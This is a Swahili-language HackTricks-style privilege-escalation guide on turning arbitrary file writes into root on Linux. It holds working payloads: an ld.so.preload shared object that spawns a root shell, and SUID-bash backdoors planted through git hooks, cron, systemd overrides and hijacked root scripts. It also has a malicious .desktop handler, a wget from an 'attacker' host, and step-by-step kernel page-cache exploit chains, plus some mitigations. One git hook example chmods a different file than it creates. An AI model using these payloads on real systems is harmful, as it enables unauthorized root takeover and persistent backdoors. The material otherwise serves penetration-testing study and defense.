# Kuandika Faili Yoyote kwa Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Faili hii hufanya kazi kama **`LD_PRELOAD`** env variable, lakini pia hufanya kazi katika **SUID binaries**.\
Ikiwa unaweza kuiunda au kuibadilisha, unaweza tu kuongeza **path ya library itakayopakiwa** kwa kila binary inayotekelezwa.

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** ambazo **huendeshwa** wakati wa **matukio** mbalimbali katika git repository, kama vile commit inapotengenezwa, merge... Kwa hivyo, ikiwa **script au user mwenye privileges** anafanya vitendo hivi mara kwa mara na inawezekana **kuandika kwenye folder ya `.git`**, hii inaweza kutumika kwa **privesc**.

Kwa mfano, inawezekana **kutengeneza script** katika git repo ndani ya **`.git/hooks`** ili itekelezwe kila mara commit mpya inapotengenezwa:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

Ikiwa unaweza **kuandika files zinazohusiana na cron ambazo root huziendesha**, kwa kawaida unaweza kupata code execution wakati mwingine job inapotekelezwa. Malengo ya kuvutia ni pamoja na:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- crontab ya root katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- timers za `systemd` na services zinazoanzishwa nazo

Ukaguzi wa haraka:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Ongeza root cron job mpya** kwenye `/etc/crontab` au faili lililo katika `/etc/cron.d/`
- **Badilisha script** ambayo tayari inaendeshwa na `run-parts`
- **Weka backdoor kwenye timer target iliyopo** kwa kurekebisha script au binary inayozinduliwa

Mfano mdogo wa cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili inayoweza kutekelezwa humo badala yake:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Maelezo:

- `run-parts` kwa kawaida hupuuza majina ya faili yenye nukta, kwa hivyo pendelea majina kama `backup` badala ya `backup.sh`.
- Baadhi ya distros hutumia `anacron` au timers za `systemd` badala ya cron ya kawaida, lakini wazo la abuse ni lilelile: **modify kile ambacho root itatekeleza baadaye**.

### Faili za Service na Socket

Ikiwa unaweza kuandika **`systemd` unit files** au faili zinazorejelewa nazo, unaweza kupata code execution kama root kwa kureload na kurestart unit, au kwa kusubiri service/socket activation path i-trigger.

Targets za kuvutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides katika `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries zinazorejelewa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- `EnvironmentFile=` paths zinazoweza kuandikwa na zinazopakiwa na service ya root

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Njia za kawaida za abuse:

- **Overwrite `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza kuirekebisha
- **Add a drop-in override** yenye `ExecStart=` hasidi na uondoe ya zamani kwanza
- **Backdoor** script/binary ambayo tayari imerejelewa na unit
- **Hijack** socket-activated service kwa kurekebisha faili ya `.service` inayozinduliwa socket inapopokea connection

Mfano wa override hasidi:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Mtiririko wa kawaida wa activation:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ikiwa huwezi kuanzisha upya services mwenyewe lakini unaweza kuhariri unit iliyoamilishwa na socket, huenda ukahitaji tu **kusubiri muunganisho wa client** ili kuchochea utekelezaji wa service yenye backdoor kama root.

### Overwrite `php.ini` yenye vizuizi inayotumiwa na PHP sandbox yenye privileged

Baadhi ya daemons maalum huthibitisha PHP inayotolewa na mtumiaji kwa kuendesha `php` ikiwa na **`php.ini` yenye vizuizi** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code iliyo kwenye sandbox bado ina **uwezo wowote wa kuandika** (kama `file_put_contents`) na unaweza kufikia **path kamili ya `php.ini`** inayotumiwa na daemon, unaweza **kuandika upya config hiyo** ili kuondoa vizuizi, kisha utume payload ya pili inayotekelezwa ikiwa na privileges zilizoinuliwa.

Mtiririko wa kawaida:

1. Payload ya kwanza huandika upya sandbox config.
2. Payload ya pili hutekeleza code baada ya functions hatari kuwezeshwa tena.

Mfano wa chini (badilisha path inayotumiwa na daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), execution ya pili hupata root context. Hii kimsingi ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika files.

### binfmt_misc

File iliyo katika `/proc/sys/fs/binfmt_misc` huonyesha ni binary gani inapaswa ku-execute aina fulani ya files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (kama http: au https:)

Attacker aliye na write permissions kwenye configuration directories za victim anaweza kwa urahisi kubadilisha au kuunda files zinazobadilisha tabia ya mfumo, na kusababisha code execution isiyokusudiwa. Kwa kubadilisha file ya `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwenye file hasidi (kwa mfano, kuweka `x-scheme-handler/http=evil.desktop`), attacker anahakikisha kwamba **kubofya link yoyote ya http au https kuna-trigger code iliyobainishwa katika file hiyo ya `evil.desktop`**. Kwa mfano, baada ya kuweka code hasidi ifuatayo katika `evil.desktop` ndani ya `$HOME/.local/share/applications`, kubofya URL yoyote ya nje kuna-run command iliyowekwa ndani:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Kwa maelezo zaidi, angalia [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) ambapo ilitumika ku-exploit real vulnerability.

### Root ikitekeleza scripts/binaries zinazoweza kuandikwa na user

Ikiwa privileged workflow inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote iliyo ndani ya directory inayomilikiwa na unprivileged user), unaweza kuiteka:

- **Tambua utekelezaji:** monitor processes kwa kutumia [pspy](https://github.com/DominicBreuker/pspy) ili kunasa root iki-invoke paths zinazodhibitiwa na user:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Thibitisha writeability:** hakikisha faili lengwa na directory yake zinamilikiwa na mtumiaji wako na zinaweza kuandikwa na mtumiaji wako.
- **Hijack target:** backup binary/script ya awali na weka payload inayounda SUID shell (au root action nyingine yoyote), kisha restore permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (kwa mfano, kubonyeza UI button inayozindua helper). Root itakapoendesha tena path iliyotekwa, pata escalated shell kwa `./rootshell -p`.

### Page-cache-only file modification of privileged binaries

Baadhi ya kernel bugs hazibadilishi file **iliyo kwenye disk**. Badala yake, zinakuruhusu kubadilisha tu **page cache copy ya file inayoweza kusomeka**. Ikiwa unaweza kulenga binary yenye **setuid** au inayotekelezwa na **root**, execution inayofuata inaweza kuendesha bytes zinazodhibitiwa na attacker kutoka kwenye memory na kuongeza privileges, ingawa file hash iliyo kwenye disk haijabadilika.

Hii ni muhimu kuifikiria kama **runtime-only file write primitive**:

- **Disk inabaki safi**: inode na bytes zilizo kwenye disk hazibadiliki
- **Memory ni dirty**: processes zinazosoma au kuendesha cached page hupata content iliyobadilishwa na attacker
- **Effect ni ya muda**: mabadiliko hupotea baada ya reboot au cache eviction

Primitive hii iko kati ya **arbitrary file write** ya kawaida na bugs za zamani za **page-cache abuse** kama Dirty COW / Dirty Pipe:

- Dirty COW ilitegemea race
- Dirty Pipe ilikuwa na write-position constraints
- Primitive ya page-cache-only inaweza kuwa ya kuaminika zaidi ikiwa vulnerable path inatoa writes za moja kwa moja kwenye cached file-backed pages

#### Generic privesc flow

1. Pata kernel primitive inayoweza kuandika kwenye **file-backed page cache pages**
2. Itumie dhidi ya **readable privileged binary** au file nyingine inayotekelezwa na root
3. Trigger execution **kabla** page haijaondolewa kwenye cache
4. Pata code execution kama root huku file iliyo kwenye disk ikiendelea kuonekana kuwa haijabadilishwa

Typical high-value targets:

- **setuid-root** binaries
- Helpers zinazozinduliwa na **root services**
- Binaries zinazoendeshwa mara kwa mara kutoka kwenye **containers zinazoshiriki host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) ni mfano mzuri wa class hii. Vulnerable path ilikuwa kwenye Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` inaweza kuhamisha references za page-cache pages kutoka kwenye file inayoweza kusomeka kwenda kwenye crypto TX scatterlist
- in-place `algif_aead` decrypt path ilitumia tena source na destination buffers
- `authencesn` kisha iliandika kwenye destination tag region
- region hiyo ilipokuwa bado inareference spliced file-backed pages, write iliishia kwenye **page cache ya target file**

Kwa hiyo technique inayovutia si CVE yenyewe, bali pattern hii:

- **feed file-backed cache pages kwenye kernel subsystem**
- ifanye subsystem **izichukulie kama writable output**
- trigger overwrite ndogo inayodhibitiwa kwenye memory

Public PoC ilitumia **4-byte writes** zinazorudiwa ku-patch `/usr/bin/su` kwenye memory, kisha ikaitekeleza.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) inaonyesha variant nyingine ya pattern hiyo hiyo ya **page-cache-only write-to-root**, lakini wakati huu sink ni **IPsec ESP decrypt** badala ya `AF_ALG`.

Technique muhimu ni **metadata-laundering step**:

- `splice()` huweka **read-only file-backed page-cache page** ndani ya ESP-in-UDP packet
- mitigation ya awali ya DirtyFrag iliweka tag `SKBFL_SHARED_FRAG` kwenye skb ili `esp_input()` ifanye **copy kabla ya decrypting**
- netfilter `TEE` hunakili packet kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone huhifadhi **physical page-cache reference ileile** lakini hupoteza `SKBFL_SHARED_FRAG`
- `esp_input()` basi huichukulia clone kuwa salama na huendesha **in-place `cbc(aes)` decrypt** juu ya file-backed page

Kwa hiyo somo kwa reviewer ni pana kuliko CVE: ikiwa mitigation inategemea **skb/page metadata** kuamua ikiwa operation lazima ifanye copy kwanza, **clone/copy path** yoyote inayohifadhi backing page lakini kuondoa metadata inaweza kufungua tena write primitive bila kutambuliwa.

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya private network namespace**
2. washa loopback na uweke **netfilter `TEE` rule** kwenye `mangle/OUTPUT`
3. weka **XFRM ESP transport SAs** kupitia `NETLINK_XFRM`
4. encode kila target 4-byte word kwenye SA `seq_hi` field (DirtyFrag's word-selection trick)
5. tuma spliced ESP-in-UDP packet ili **TEE clone** ifike kwenye `esp_input()` na ifanye decrypt **in place**
6. rudia hadi page-cache copy ya `/usr/bin/su` au privileged executable nyingine iwe na code inayodhibitiwa na attacker

Kwa upande wa uendeshaji, impact ni sawa na mfano wa `AF_ALG`: file iliyo kwenye disk inabaki safi, lakini `execve()` hutumia **mutated page-cache bytes** na kutoa root.

Useful exposure checks kwa variant hii:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kupunguza attack surface kwa muda mfupi pia kunategemea path maalum hapa: kusasisha hadi kernel yenye `48f6a5356a33` hurekebisha clone path, huku kuzuia autoload ya `xt_TEE` kuondoa **flag-laundering step**, na kuzuia `esp4` / `esp6` kuondoa **decrypt sink**.

#### Exposure and hunting

Ikiwa unashuku aina hii ya bug, usitegemee ukaguzi wa integrity ya disk pekee. Pia thibitisha:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kupakuliwa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface imejengwa ndani ya kernel
- setuid binaries ni targets nzuri kwa sababu patch ya page-cache-only inaweza kutosha kubadilisha foothold ya ndani kuwa root

#### Kupunguza attack surface kwa njia ya `algif_aead`

Ikiwa interface iliyo hatarini inatolewa na module inayoweza kupakiwa:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ikiwa imecompiled kwenye kernel, baadhi ya disclosures ziliripotiwa kuzuia init path kwa:
```bash
initcall_blacklist=algif_aead_init
```
Aina hii ya mitigation inafaa kukumbukwa pia kwa kernel LPE nyingine: ikiwa exploitation inategemea interface maalum ya hiari, ku-disable au ku-blacklist interface hiyo kunaweza kuvunja njia ya exploit hata kabla full kernel upgrade haijapatikana.

## Marejeo

- [HTB Bamboo – kuteka script inayotekelezwa na root katika directory ya PaperCut inayoweza kuandikwa na mtumiaji](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Maswali yanayoulizwa mara kwa mara kuhusu Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Taarifa ya ufichuzi ya Openwall oss-security kuhusu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Ushauri wa Copy Fail](https://copy.fail/)
- [Maelezo ya kiufundi ya Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [Hazina ya DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Kuchanganua na kutumia Linux LPE variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: net: skb: kuhifadhi `SKBFL_SHARED_FRAG` katika `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Mitigation ya awali ya Linux: kuweka `SKBFL_SHARED_FRAG` kwa paketi za UDP zilizosplice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
